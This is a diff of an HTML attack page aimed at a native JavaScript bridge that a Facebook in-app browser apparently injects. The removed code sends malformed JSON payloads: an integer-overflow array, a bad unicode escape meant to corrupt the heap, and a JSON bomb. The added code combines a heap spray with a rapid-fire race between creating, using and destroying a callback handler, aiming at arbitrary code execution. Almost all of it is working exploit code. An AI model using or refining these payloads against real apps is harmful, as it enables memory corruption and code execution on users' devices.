@@ -2,48 +2,63 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSON Parser ACE Fuzzer</title>
+    <title>JSI Race Condition & Heap Spray ACE</title>
 </head>
-<body style="background:#000; color:#ff0; font-family:monospace;">
-    <h3>Attacking Native JSON Deserializer...</h3>
-    <div id="log">Waiting for bridge...</div>
+<body style="background:#000; color:#f0f; font-family:monospace;">
+    <h3>Thrashing Native Bridge Threads...</h3>
+    <div id="log">Awaiting bridge injection...</div>
 
     <script>
         const logEl = document.getElementById('log');
         const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
 
-        // Attack 1: Integer Overflow in Array Allocation
-        // If the parser multiplies this by the element size, it wraps to a small number,
-        // allocating a tiny heap buffer that we immediately overflow.
-        const intOverflowJSON = '{"action":"init", "data": [' + "1,".repeat(50000) + ' 1], "size": 4294967295}';
-
-        // Attack 2: Malformed Unicode Escape Heap Corruption
-        // Some C++ parsers miscalculate buffer sizes for \uXXXX escapes.
-        // We pad it with A's (0x41) to try and overwrite the next heap chunk header.
-        const badUnicodeJSON = '{"message": "A\\uD800\\uD800' + 'A'.repeat(5000) + '"}';
-
-        // Attack 3: The "Billion Laughs" JSON Bomb
-        // Exponential entity expansion equivalent for JSON to exhaust heap memory rapidly.
-        let nested = '{"a":"A"}';
-        for(let i=0; i<15; i++) {
-            nested = `{"a": ${nested}, "b": ${nested}}`;
+        // 1. The Heap Spray
+        // We continuously allocate massive arrays of 0x41414141 in JavaScript.
+        // V8 will eventually promote these to the native C++ heap.
+        let spray = [];
+        function sprayHeap() {
+            for (let i = 0; i < 500; i++) {
+                let arr = new Uint32Array(1024);
+                arr.fill(0x41414141);
+                spray.push(arr);
+            }
+            if (spray.length > 5000) spray = []; // Prevent OOM crashes
         }
-        const jsonBomb = nested;
 
-        function fireJSONFuzzer() {
+        // 2. The Asynchronous Race Condition
+        function thrashBridge() {
             if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                logEl.innerText = "[*] Bridge active. Firing hostile JSON...";
-                
                 let bridge = window.__call_iabjs_unified_bridge;
-
-                // Send the malicious JSON payloads
-                try { bridge("BrowserDeclutterJS", uuid, intOverflowJSON); } catch(e) {}
-                try { bridge("initializeCallbackHandler", uuid, badUnicodeJSON); } catch(e) {}
-                try { bridge("page_language", uuid, jsonBomb); } catch(e) {}
+                
+                // Rapidly queue conflicting lifecycle commands
+                // We want C++ to initialize, free, and access the callback handler out of order
+                bridge("initializeCallbackHandler", uuid, '{"message":{"name":"test"}}');
+                
+                // Trigger an action that forces the bridge to look up the handler we just made
+                bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
+                
+                // Tell the bridge to destroy the handler, racing against the lookup above
+                bridge("destroyCallbackHandler", uuid, "{}"); // Guessing the teardown method name
+                bridge("page_language", uuid, "{}"); // Alternative action to force state change
             }
         }
 
-        setInterval(fireJSONFuzzer, 100);
+        // 3. Execution Engine
+        function startAttack() {
+            if (typeof window.__call_iabjs_unified_bridge === 'function') {
+                logEl.innerHTML = "<span style='color:red;'>[*] BRIDGE DETECTED. EXECUTING THREAD RACE...</span>";
+                
+                // Spray the heap concurrently with the bridge thrashing
+                setInterval(sprayHeap, 10);
+                
+                // Fire the race condition as fast as the JS event loop allows
+                setInterval(thrashBridge, 1); 
+            } else {
+                setTimeout(startAttack, 50); // Wait for FB to inject the bridge
+            }
+        }
+
+        startAttack();
     </script>
 </body>
 </html>
